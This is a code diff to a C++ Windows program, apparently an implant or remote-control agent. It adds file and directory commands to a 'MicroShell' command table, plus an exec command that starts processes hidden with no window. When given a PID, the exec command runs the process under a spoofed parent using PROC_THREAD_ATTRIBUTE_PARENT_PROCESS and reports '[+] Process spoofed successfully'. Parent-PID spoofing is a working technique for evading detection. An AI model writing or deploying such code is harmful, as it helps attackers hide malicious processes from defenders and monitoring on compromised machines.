@@ -231,14 +231,157 @@ std::string static InternalCommand_PS(const std::string& args)
 
 }
 
+std::string static InternalCommand_MKDIR(const std::string& args)
+{
+    if(args.empty()) return "Error: mkdir requires a directory name.\n";
+
+    if(CreateDirectoryA(args.c_str(), nullptr)) return "Directory created: " + args + "\n";
+    
+    return "Error: Failed to create directory. Code: " + std::to_string(GetLastError()) + "\n";
+}
+
+std::string static InternalCommand_RM(const std::string& args)
+{
+    if(args.empty()) return "Error: rm requires a file name.\n";
+
+    if(DeleteFileA(args.c_str())) return "File deleted: " + args + "\n";
+    
+    return "Error: Failed to delete file. Code: " + std::to_string(GetLastError()) + "\n";
+}
+
+std::string InternalCommand_EXEC(const std::string& args)
+{
+    if(args.empty()) return "Error: exec requires a target executable.\n";
+
+    std::string command = args;
+    DWORD targetPid = 0;
+
+    // Parse arguments to see if a PID was provided at the end
+    size_t lastSpace = args.find_last_of(' ');
+    if(lastSpace != std::string::npos)
+    {
+        std::string possiblePid = args.substr(lastSpace + 1);
+        bool isNumeric = true;
+        
+        // Verify every character in the last token is a digit
+        for(char c : possiblePid)
+        {
+            if(!isdigit(c))
+            {
+                isNumeric = false;
+                break;
+            }
+        }
+
+        if(isNumeric && !possiblePid.empty())
+        {
+            targetPid = std::stoul(possiblePid);
+            command = args.substr(0, lastSpace);
+            
+            // Clean up any trailing whitespace from the command string
+            command.erase(command.find_last_not_of(" \n\r\t") + 1);
+        }
+    }
+
+    // Safely copy the command string into a writable buffer for the Windows API
+    std::vector<char> cmdline(command.begin(), command.end());
+    cmdline.push_back('\0');
+
+    if(targetPid == 0)
+    {
+        // --- NORMAL CREATION ---
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+        
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+
+        if(CreateProcessA(NULL, cmdline.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+        {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return "[+] Process started normally: '" + command + "'\n";
+        }
+        else return "[-] Error: Normal execution failed. Code: " + std::to_string(GetLastError()) + "\n";
+    }
+    else
+    {
+        // --- SPOOFED CREATION (PID provided) ---
+        HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPid);
+        if(hParent == NULL) return "[-] Error: Failed to open Parent PID " + std::to_string(targetPid) + ". Code: " + std::to_string(GetLastError()) + "\n";
+
+        SIZE_T attributeSize = 0;
+        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+
+        PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+        if(pAttributeList == NULL)
+        {
+            CloseHandle(hParent);
+            return "[-] Error: Failed to allocate Attribute List.\n";
+        }
+
+        if(!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize))
+        {
+            HeapFree(GetProcessHeap(), 0, pAttributeList);
+            CloseHandle(hParent);
+            return "[-] Error: Failed to initialize Attribute List.\n";
+        }
+
+        if(!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL))
+        {
+            DeleteProcThreadAttributeList(pAttributeList);
+            HeapFree(GetProcessHeap(), 0, pAttributeList);
+            CloseHandle(hParent);
+            return "[-] Error: Failed to update Attribute List.\n";
+        }
+
+        STARTUPINFOEXA siex;
+        PROCESS_INFORMATION pi;
+        
+        ZeroMemory(&siex, sizeof(siex));
+        siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+        siex.lpAttributeList = pAttributeList;
+        ZeroMemory(&pi, sizeof(pi));
+
+        BOOL success = CreateProcessA(NULL, cmdline.data(), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &siex.StartupInfo, &pi);
+
+        DeleteProcThreadAttributeList(pAttributeList);
+        HeapFree(GetProcessHeap(), 0, pAttributeList);
+        CloseHandle(hParent);
+
+        if(success)
+        {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return "[+] Process spoofed successfully: '" + command + "' as child of PID " + std::to_string(targetPid) + "\n";
+        }
+        else return "[-] Error: Spoofed execution failed. Code: " + std::to_string(GetLastError()) + "\n";
+    }
+}
+
+std::string static InternalCommand_RMDIR(const std::string& args)
+{
+    if(args.empty()) return "Error: rmdir requires a directory name.\n";
+
+    if(RemoveDirectoryA(args.c_str())) return "Directory removed: " + args + "\n";
+    
+    return "Error: Failed to remove directory. Code: " + std::to_string(GetLastError()) + "\n";
+}
+
+
 void static InitializeMicroShell()
 {
     g_CommandMap["ls"] = InternalCommand_LS;
     g_CommandMap["dir"] = InternalCommand_LS;
     g_CommandMap["cd"] = InternalCommand_CD;
-    g_CommandMap["whoami"] = InternalCommand_WHOAMI;
     g_CommandMap["ps"] = InternalCommand_PS;
-    // to add: run exes, mkdir, rm, etc.. something to send and get raw data
+    g_CommandMap["whoami"] = InternalCommand_WHOAMI;
+    g_CommandMap["mkdir"] = InternalCommand_MKDIR;
+    g_CommandMap["rmdir"] = InternalCommand_RMDIR;
+    g_CommandMap["rm"] = InternalCommand_RM;
+    g_CommandMap["run"] = InternalCommand_EXEC;
+    // to add: run exes, etc.. something to send and get raw data
 }
 
 #pragma endregion
